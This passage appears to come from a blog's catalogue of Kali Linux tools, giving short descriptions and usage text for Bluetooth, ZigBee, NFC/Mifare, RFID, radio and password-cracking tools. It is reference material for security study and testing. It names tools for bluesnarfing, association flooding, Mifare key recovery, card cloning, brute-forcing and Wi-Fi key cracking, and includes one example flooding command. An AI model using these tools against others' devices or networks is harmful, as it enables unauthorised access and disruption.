<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>BlueRanger 1.0 by JP Dunning (.ronin) 
</span><span class='line'>&lt;www.hackfromacave.com&gt;
</span><span class='line'>(c) 2009-2012 Shadow Cave LLC.
</span><span class='line'>
</span><span class='line'>NAME
</span><span class='line'>  blueranger
</span><span class='line'>
</span><span class='line'>SYNOPSIS
</span><span class='line'>        blueranger.sh &lt;hciX&gt; &lt;bdaddr&gt;
</span><span class='line'>
</span><span class='line'>DESCRIPTION
</span><span class='line'>  &lt;hciX&gt;         Local interface
</span><span class='line'>  &lt;bdaddr&gt;       Remote Device Address</span></code></pre></td></tr></table></div></figure>


<p><strong>bluesnarfer</strong></p>

<p>A Bluetooth bluesnarfing Utility.</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/wifi/bluesnarfer.png" title="bluesnarfer" alt="bluesnarfer"></p>

<p><strong>btscanner</strong></p>

<p>btscanner is a tool designed specifically to extract as  much  information  as  possible  from  a Bluetooth device without the requirement to
pair. A detailed information screen extracts HCI and  SDP  information,
and  maintains an open connection to monitor the RSSI and link quality.
btscanner is based on the BlueZ Bluetooth stack, which is included with
recent  Linux kernels, and the BlueZ toolset. btscanner also contains a
complete listing of the IEEE OUI numbers and class lookup tables. Using
the information gathered from these sources it is possible to make educated guesses as to the host device type.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: btscanner [options]
</span><span class='line'>options
</span><span class='line'>  --help  Display help
</span><span class='line'>  --cfg=&lt;file&gt;  Use &lt;file&gt; as the config file
</span><span class='line'>  --no-reset  Do not reset the Bluetooth adapter before scanning</span></code></pre></td></tr></table></div></figure>


<p><strong>redfang</strong></p>

<p>RedFang is a small proof-of-concept application to find non discoverable Bluetooth devices. This is done by brute forcing the last six (6) bytes of the Bluetooth address of the device and doing a read_remote_name().</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/wifi/redfang.png" title="redfang" alt="redfang"></p>

<p><strong>spooftooph</strong></p>

<p>Spooftooph is designed to automate spoofing or cloning Bluetooth device information. Make a Bluetooth device hide in plain site.</p>

<p>Features:</p>

<ul>
<li><p>Clone and log Bluetooth device information</p></li>
<li><p>Generate a random new Bluetooth profile</p></li>
<li><p>Change Bluetooth profile every X seconds</p></li>
<li><p>Specify device information for Bluetooth interface</p></li>
<li><p>Select device to clone from scan log</p></li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/kali/wifi/spooftooph.png" title="spooftooph" alt="spooftooph"></p>

<h3>Other Wireless Tools</h3>

<p><strong>zbassocflood</strong></p>

<p>Transmit a flood of associate requests to a target network.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>zbassocflood: Transmit a flood of associate requests to a target network.
</span><span class='line'>jwright@willhackforsushi.com
</span><span class='line'>
</span><span class='line'>Usage: zbassocflood [-pcDis] [-i devnumstring] [-p PANID] [-c channel]
</span><span class='line'>                        [-s per-packet delay/float]
</span><span class='line'>
</span><span class='line'>e.x. zbassocflood -p 0xBAAD -c 11 -s 0.1</span></code></pre></td></tr></table></div></figure>


<p><strong>zbdsniff</strong></p>

<p>Decode plaintext key ZigBee delivery from a capture file.  Will
process libpcap or Daintree SNA capture files.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>zbdsniff: Decode plaintext key ZigBee delivery from a capture file.  Will
</span><span class='line'>process libpcap or Daintree SNA capture files.    jwright@willhackforsushi.com
</span><span class='line'>
</span><span class='line'>Usage: zbdsniff [capturefiles ...]</span></code></pre></td></tr></table></div></figure>


<p><strong>zbdump</strong></p>

<p>A tcpdump-like tool for ZigBee/IEEE 802.15.4 networks</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>zbdump - a tcpdump-like tool for ZigBee/IEEE 802.15.4 networks
</span><span class='line'>Compatible with Wireshark 1.1.2 and later - jwright@willhackforsushi.com
</span><span class='line'>
</span><span class='line'>Usage: zbdump [-fiwDch] [-f channel] [-w pcapfile] [-W daintreefile] 
</span><span class='line'>         [-i devnumstring]</span></code></pre></td></tr></table></div></figure>


<p><strong>zbfind</strong></p>

<p>zbfind provides a GTK-based GUI to the user which displays the results of a zbstumbler-like functionality. zbfind sends beacon requests as it cycles through channels and listens for a response, adding the response to a table as well as displaying signal strength on a gauge widget.</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/wifi/zbfind.png" title="zbfind" alt="zbfind"></p>

<p><strong>zbgoodfind</strong></p>

<p>Search a binary file to identify the encryption key for a given
SNA or libpcap IEEE 802.15.4 encrypted packet</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>zbgoodfind - search a binary file to identify the encryption key for a given
</span><span class='line'>SNA or libpcap IEEE 802.15.4 encrypted packet - jwright@willhackforsushi.com
</span><span class='line'>
</span><span class='line'>Usage: zbgoodfind [-frRFd] [-f binary file] [-r pcapfile] [-R daintreefile] 
</span><span class='line'>         [-F Don't skip 2-byte FCS at end of each frame]
</span><span class='line'>         [-d genenerate binary file (test mode)]</span></code></pre></td></tr></table></div></figure>


<p><strong>zbreplay</strong></p>

<p>Replay ZigBee/802.15.4 network traffic from libpcap or Daintree files</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>zbreplay: replay ZigBee/802.15.4 network traffic from libpcap or Daintree files
</span><span class='line'>jwright@willhackforsushi.com
</span><span class='line'>
</span><span class='line'>Usage: zbreplay [-rRfiDch] [-f channel] [-r pcapfile] [-R daintreefile] 
</span><span class='line'>         [-i devnumstring] [-s delay/float] [-c countpackets]</span></code></pre></td></tr></table></div></figure>


<p><strong>zbstumbler</strong></p>

<p>Transmit beacon request frames to the broadcast address while
channel hopping to identify ZC/ZR devices.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>zbstumbler: Transmit beacon request frames to the broadcast address while
</span><span class='line'>channel hopping to identify ZC/ZR devices.  jwright@willhackforsushi.com
</span><span class='line'>
</span><span class='line'>Usage: zbstumbler [-iscwD] [-i devnumstring] [-s per-channel delay] [-c channel]
</span><span class='line'>                          [-w report.csv]</span></code></pre></td></tr></table></div></figure>


<h3>RFID / NFC Tools</h3>

<h3>NFC Tools</h3>

<p><strong>mfcuk</strong></p>

<p>Toolkit containing samples and various tools based on and around libnfc and crapto1, with emphasis on Mifare Classic NXP/Philips RFID cards. Special emphasis of the toolkit is on the following:</p>

<ul>
<li><p>mifare classic weakness demonstration/exploitation</p></li>
<li><p>demonstrate use of libnfc (and ACR122 readers)</p></li>
<li><p>demonstrate use of Crapto1 implementation to confirm internal workings and to verify theoretical/practical weaknesses/attacks</p></li>
</ul>


<p><strong>mfoc</strong></p>

<p>MFOC is an open source implementation of “offline nested” attack by Nethemba.
This program allow to recover authentication keys from MIFARE Classic card.
Please note MFOC is able to recover keys from target only if it have a known key: default one (hardcoded in MFOC) or custom one (user provided using command line).</p>

<p><strong>mfterm</strong></p>

<p>A terminal interface for working with Mifare tags.</p>

<p>The  program  is  used as an interactive shell to read and write Mifare
tags using libnfc and a libnfc compatible reader or to  simply  manipulate Mifare data dumps from files.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>A terminal interface for working with Mifare Classic tags.
</span><span class='line'>Usage: mfterm [-v] [-h] [-k keyfile]
</span><span class='line'>
</span><span class='line'>Options: 
</span><span class='line'>  --help          (-h)   Show this help message.
</span><span class='line'>  --version       (-v)   Display version information.
</span><span class='line'>  --tag=tagfile   (-t)   Load a tag from the specified file.
</span><span class='line'>  --keys=keyfile  (-k)   Load keys from the specified file.
</span><span class='line'>  --dict=dictfile (-d)   Load dictionary from the specified file.
</span><span class='line'>
</span><span class='line'>Report bugs to: anders@4zm.org
</span><span class='line'>mfterm home page: &lt;https://github.com/4zm/mfterm&gt;</span></code></pre></td></tr></table></div></figure>


<p><strong>mifare-classic-format</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>usage: mifare-classic-format [-fy] [keyfile]
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>  -f      Fast format (only erase MAD)
</span><span class='line'>  -y      Do not ask for confirmation (dangerous)
</span><span class='line'>  keyfile Use keys from dump in addition to internal default keys</span></code></pre></td></tr></table></div></figure>


<p><strong>nfc-list</strong></p>

<p>nfc-list  is  a utility for listing any available tags like ISO14443-A,
FeliCa, Jewel or ISO14443-B (according to the device capabilities).  It
may  detect several tags at once thanks to a mechanism called anti-collision but all types of tags don&rsquo;t support anti-collision and there  is
some physical limitation of the number of tags the reader can discover.</p>

<p>This tool displays all available information at selection time.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nfc-list uses libnfc 1.7.0
</span><span class='line'>usage: nfc-list [-v]
</span><span class='line'>  -v   verbose display</span></code></pre></td></tr></table></div></figure>


<p><strong>nfc-mfclassic</strong></p>

<p>nfc-mfclassic is a MIFARE Classic tool that allow to read or write DUMP
file using MIFARE keys provided in KEYS file.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: nfc-mfclassic r|R|w|W a|b &lt;dump.mfd&gt; [&lt;keys.mfd&gt; [f]]
</span><span class='line'>  r|R|w|W       - Perform read from (r) or unlocked read from (R) or write to (w) or unlocked write to (W) card
</span><span class='line'>                  *** note that unlocked write will attempt to overwrite block 0 including UID
</span><span class='line'>                  *** unlocked read does not require authentication and will reveal A and B keys
</span><span class='line'>                  *** unlocking only works with special Mifare 1K cards (Chinese clones)
</span><span class='line'>  a|A|b|B       - Use A or B keys for action; Halt on errors (a|b) or tolerate errors (A|B)
</span><span class='line'>  &lt;dump.mfd&gt;    - MiFare Dump (MFD) used to write (card to MFD) or (MFD to card)
</span><span class='line'>  &lt;keys.mfd&gt;    - MiFare Dump (MFD) that contain the keys (optional)
</span><span class='line'>  f             - Force using the keyfile even if UID does not match (optional)</span></code></pre></td></tr></table></div></figure>


<h3>RFIDiot ACG</h3>

<h3>RFIDiot FROSCH</h3>

<h3>RFIDiot PCSC</h3>

<p>A collection of tools and libraries for exploring RFID technology, written
in Python.</p>

<p><strong>ChAP.py</strong></p>

<p>Script that tries to select the EMV Payment Systems Directory on all inserted cards.</p>

<p><strong>bruteforce.py</strong></p>

<p>Try random numbers to login to sector 0</p>

<p><strong>cardselect.py</strong></p>

<p>Select card and display ID</p>

<p><strong>copytag.py</strong></p>

<p>Read all sectors from a standard tag and write them back to a blank</p>

<p><strong>demotag.py</strong></p>

<p>Test IAIK TUG DemoTag</p>

<p><strong>eeprom.py</strong></p>

<p>Display reader&rsquo;s eeprom settings</p>

<p><strong>fdxbnum.py</strong></p>

<p>Generate / decode FDX-B EM4x05 compliant IDs</p>

<p><strong>formatmifare1kvalue.py</strong></p>

<p>Format value blocks on a mifare standard tag</p>

<p><strong>froschtest.py</strong></p>

<p>Test frosch HTRM112 reader</p>

<p><strong>hidprox.py</strong></p>

<p>Show HID Prox card type and site/id code</p>

<p><strong>hitag2brute.py</strong></p>

<p>Brute Force hitag2 password</p>

<p><strong>hitag2reset.py</strong></p>

<p>Reset hitag2 password</p>

<p><strong>isotype.py</strong></p>

<p>Determine ISO tag type</p>

<p><strong>jcopmifare.py</strong></p>

<p>Test program for mifare emulation on JCOP</p>

<p><strong>jcopsetatrhist.py</strong></p>

<p>Set ATR History bytes on JCOP cards</p>

<p><strong>jcoptool.py</strong></p>

<p>JCOP card toolkit</p>

<p><strong>lfxtype.py</strong></p>

<p>Select card and display tag type</p>

<p><strong>loginall.py</strong></p>

<p>Attempt to login to each sector with transport keys</p>

<p><strong>mifarekeys.py</strong></p>

<p>Calculate 3DES key for Mifare access on JCOP cards</p>

<p><strong>mrpkey.py</strong></p>

<p>Calculate 3DES key for Machine Readable Passport</p>

<p><strong>multiselect.py</strong></p>

<p>Continuously select card and display ID</p>

<p><strong>nfcid.py</strong></p>

<p>Python code for Identifying NFC cards</p>

<p><strong>pn532emulate.py</strong></p>

<p>Switch NXP PN532 reader chip into TAG emulation mode</p>

<p><strong>pn532mitm.py</strong></p>

<p>NXP PN532 Man-In-The_Middle &ndash; log conversations between TAG and external reader</p>

<p><strong>q5reset.py</strong></p>

<p>Reset q5 tag</p>

<p><strong>readlfx.py</strong></p>

<p>Read all sectors from a LFX reader</p>

<p><strong>readmifare1k.py</strong></p>

<p>Read all sectors from a mifare standard tag</p>

<p><strong>readmifaresimple.py</strong></p>

<p>Read all sectors from a mifare tag</p>

<p><strong>readmifareultra.py</strong></p>

<p>Read all sectors from a Ultralight tag</p>

<p><strong>readtag.py</strong></p>

<p>Read all sectors from a standard tag</p>

<p><strong>rfidiot-cli.py</strong></p>

<p>CLI for rfidiot</p>

<p><strong>send_apdu.py</strong></p>

<p>Python code for Sending raw APDU commands</p>

<p><strong>sod.py</strong></p>

<p>Try to find X509 data in EF.SOD</p>

<p><strong>transit.py</strong></p>

<p>Generate / decode FDI Matalec Transit 500 and Transit 999 UIDs</p>

<p><strong>unique.py</strong></p>

<p>Generate EM4x02 and/or UNIQUE compliant IDs</p>

<p><strong>writelfx.py</strong></p>

<p>Read and then write all sectors from a LFX reader</p>

<p><strong>writemifare1k.py</strong></p>

<p>Write all blocks on a mifare standard tag</p>

<p>Check <a href="http://rfidiot.org/">http://rfidiot.org/</a> for more information and examples</p>

<h3>Software Defined Radio</h3>

<p><strong>gnuradio-companion</strong></p>

<p>A graphical tool for creating signal flow graphs and generating flow-graph source code.</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/wifi/gnuradio.png" title="gnuradio-companion" alt="gnuradio"></p>

<p><strong>gqrx</strong></p>

<p>Gqrx is a software defined radio receiver powered by the GNU Radio SDR framework and the Qt graphical toolkit. Gqrx supports many of the SDR hardware available, including Funcube Dongles, rtl-sdr, HackRF and USRP devices.</p>

<p>Currently it works on Linux and Mac and supports the following devices:. Funcube Dongle Pro and Pro+ RTL2832U-based DVB-T dongles (rtlsdr via USB and TCP) OsmoSDR USRP HackRF Jawbreaker Nuand bladeRF any other device supported by the gr-osmosdr library</p>

<p>The latest stable version of Gqrx is 2.2, it is available for Linux, FreeBSD and Mac and it offers the following features:</p>

<ul>
<li><p>Discover devices attached to the computer.</p></li>
<li><p>Process I/Q data from the supported devices.</p></li>
<li><p>Change frequency, gain and apply various corrections (frequency, I/Q balance).</p></li>
<li><p>AM, SSB, FM-N and FM-W (mono and stereo) demodulators.</p></li>
<li><p>Special FM mode for NOAA APT.</p></li>
<li><p>Variable band pass filter.</p></li>
<li><p>AGC, squelch and noise blankers.</p></li>
<li><p>FFT plot and waterfall.</p></li>
<li><p>Record and playback audio to / from WAV file.</p></li>
<li><p>Spectrum analyzer mode where all signal processing is disabled.</p></li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/kali/wifi/gqrx.png" title="gqrx" alt="gqrx"></p>

<p><strong>gr-scan</strong></p>

<p>gr-scan is a program written in C++, and built upon GNU Radio, rtl-sdr, and the OsmoSDR Source Block. It is intended to scan a range of frequencies and print a list of discovered signals. It should work with any device that works with that block, including Realtek RTL2832U devices. This software was developed using a Compro U620F, which uses an E4000 tuner</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/wifi/gr-scan.png" title="gr-scan" alt="gr-scan"></p>

<p><strong>modes_gui</strong></p>

<p>Part of gr-air-modes</p>

<p>gr-air-modes implements a software-defined radio receiver for Mode S
transponder signals, including ADS-B reports from equipped aircraft.</p>

<p><strong>rtl_adsb</strong></p>

<p>A simple ADS-B decoder</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/wifi/rtl_adsb.png" title="rtl_adsb" alt="rtl_adsb"></p>

<p><strong>rtl_fm</strong></p>

<p>A simple narrow band FM demodulator for RTL2832 based DVB-T receivers</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Use: rtl_fm -f freq [-options] [filename]
</span><span class='line'>  -f frequency_to_tune_to [Hz]
</span><span class='line'>   (use multiple -f for scanning, requires squelch)
</span><span class='line'>   (ranges supported, -f 118M:137M:25k)
</span><span class='line'>  [-s sample_rate (default: 24k)]
</span><span class='line'>  [-d device_index (default: 0)]
</span><span class='line'>  [-g tuner_gain (default: automatic)]
</span><span class='line'>  [-l squelch_level (default: 0/off)]
</span><span class='line'>  [-o oversampling (default: 1, 4 recommended)]
</span><span class='line'>  [-p ppm_error (default: 0)]
</span><span class='line'>  [-E sets lower edge tuning (default: center)]
</span><span class='line'>  [-N enables NBFM mode (default: on)]
</span><span class='line'>  [-W enables WBFM mode (default: off)]
</span><span class='line'>   (-N -s 170k -o 4 -A fast -r 32k -l 0 -D)
</span><span class='line'>  filename (a '-' dumps samples to stdout)
</span><span class='line'>   (omitting the filename also uses stdout)
</span><span class='line'>
</span><span class='line'>Experimental options:
</span><span class='line'>  [-r output_rate (default: same as -s)]
</span><span class='line'>  [-t squelch_delay (default: 20)]
</span><span class='line'>   (+values will mute/scan, -values will exit)
</span><span class='line'>  [-M enables AM mode (default: off)]
</span><span class='line'>  [-L enables LSB mode (default: off)]
</span><span class='line'>  [-U enables USB mode (default: off)]
</span><span class='line'>  [-R enables raw mode (default: off, 2x16 bit output)]
</span><span class='line'>  [-F enables high quality FIR (default: off/square)]
</span><span class='line'>  [-D enables de-emphasis (default: off)]
</span><span class='line'>  [-C enables DC blocking of output (default: off)]
</span><span class='line'>  [-A std/fast/lut choose atan math (default: std)]
</span><span class='line'>
</span><span class='line'>Produces signed 16 bit ints, use Sox or aplay to hear them.
</span><span class='line'>  rtl_fm ... - | play -t raw -r 24k -e signed-integer -b 16 -c 1 -V1 -
</span><span class='line'>               | aplay -r 24k -f S16_LE -t raw -c 1
</span><span class='line'>    -s 22.5k - | multimon -t raw /dev/stdin</span></code></pre></td></tr></table></div></figure>


<p><strong>rtl_sdr</strong></p>

<p>An I/Q recorder for RTL2832 based DVB-T receivers</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage:    -f frequency_to_tune_to [Hz]
</span><span class='line'>  [-s samplerate (default: 2048000 Hz)]
</span><span class='line'>  [-d device_index (default: 0)]
</span><span class='line'>  [-g gain (default: 0 for auto)]
</span><span class='line'>  [-b output_block_size (default: 16 * 16384)]
</span><span class='line'>  [-n number of samples to read (default: 0, infinite)]
</span><span class='line'>  [-S force sync output (default: async)]
</span><span class='line'>  filename (a '-' dumps samples to stdout)</span></code></pre></td></tr></table></div></figure>


<p><strong>rtlsdr-scanner</strong></p>

<p>A cross platform Python frequency scanning GUI for USB TV dongles, using the OsmoSDR rtl-sdr library.
In other words a cheap, simple Spectrum Analyser.
The scanner attempts to overcome the tuner’s frequency response by averaging scans from both the positive and negative frequency offets of the baseband data.</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/wifi/rtlsdr-scanner.png" title="rtlsdr-scanner" alt="rtlsdr-scanner"></p>

<p><strong>rtl_tcp</strong></p>

<p>An I/Q spectrum server for RTL2832 based DVB-T receivers</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage:   [-a listen address]
</span><span class='line'>  [-p listen port (default: 1234)]
</span><span class='line'>  [-f frequency to tune to [Hz]]
</span><span class='line'>  [-g gain (default: 0 for auto)]
</span><span class='line'>  [-s samplerate in Hz (default: 2048000 Hz)]
</span><span class='line'>  [-b number of buffers (default: 32, set by library)]
</span><span class='line'>  [-n max number of linked list buffers to keep (default: 500)]
</span><span class='line'>  [-d device index (default: 0)]</span></code></pre></td></tr></table></div></figure>


<p><strong>rtl_test</strong></p>

<p>A benchmark tool for RTL2832 based DVB-T receivers</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage:
</span><span class='line'>  [-s samplerate (default: 2048000 Hz)]
</span><span class='line'>  [-d device_index (default: 0)]
</span><span class='line'>  [-t enable Elonics E4000 tuner benchmark]
</span><span class='line'>  [-p enable PPM error measurement]
</span><span class='line'>  [-b output_block_size (default: 16 * 16384)]
</span><span class='line'>  [-S force sync output (default: async)]</span></code></pre></td></tr></table></div></figure>


<blockquote><p>Noise proves nothing.  Often a hen who has merely laid an egg cackles
as if she laid an asteroid.</p>

<p>&mdash; Mark Twain</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kali tools catalog - Password Attacks]]></title>
    <link href="http://chousensha.github.io/blog/2015/04/04/kali-tools-catalog-password-attacks/"/>
    <updated>2015-04-04T11:08:57-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/04/04/kali-tools-catalog-password-attacks</id>
    <content type="html"><![CDATA[<p>Tools for password related attacks</p>

<!-- more -->


<h3>GPU Tools</h3>

<p><strong>oclhashcat</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Worlds fastest password cracker
</span><span class='line'>Worlds first and only GPGPU based rule engine
</span><span class='line'>Free
</span><span class='line'>Multi-GPU (up to 128 gpus)
</span><span class='line'>Multi-Hash (up to 100 million hashes)
</span><span class='line'>Multi-OS (Linux & Windows native binaries)
</span><span class='line'>Multi-Platform (OpenCL & CUDA support)
</span><span class='line'>Multi-Algo (see below)
</span><span class='line'>Low resource utilization, you can still watch movies or play games while cracking
</span><span class='line'>Focuses highly iterated modern hashes
</span><span class='line'>Focuses dictionary based attacks
</span><span class='line'>Supports distributed cracking
</span><span class='line'>Supports pause / resume while cracking
</span><span class='line'>Supports sessions
</span><span class='line'>Supports restore
</span><span class='line'>Supports reading words from file
</span><span class='line'>Supports reading words from stdin
</span><span class='line'>Supports hex-salt
</span><span class='line'>Supports hex-charset
</span><span class='line'>Built-in benchmarking system
</span><span class='line'>Integrated thermal watchdog
</span><span class='line'>150+ Algorithms implemented with performance in mind
</span><span class='line'>... and much more</span></code></pre></td></tr></table></div></figure>


<p>Screenshot from the official <a href="http://hashcat.net/oclhashcat/">site</a> showing it in action:</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/password/oclhashcat.png" title="oclhashcat" alt="oclhashcat"></p>

<p><strong>pyrit</strong></p>

<p>Pyrit  exploits  the  computational power of many-core- and GPGPU-platforms  to  create  massive  databases,  pre-computing   part   of   the WPA/WPA2-PSK  authentication  phase  in  a space-time tradeoff. It is a
powerful attack against one of the world&rsquo;s  most  used  security protocols.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Pyrit 0.4.0 (C) 2008-2011 Lukas Lueg http://pyrit.googlecode.com
</span><span class='line'>This code is distributed under the GNU General Public License v3+
</span><span class='line'>
</span><span class='line'>Usage: pyrit [options] command
</span><span class='line'>
</span><span class='line'>Recognized options:
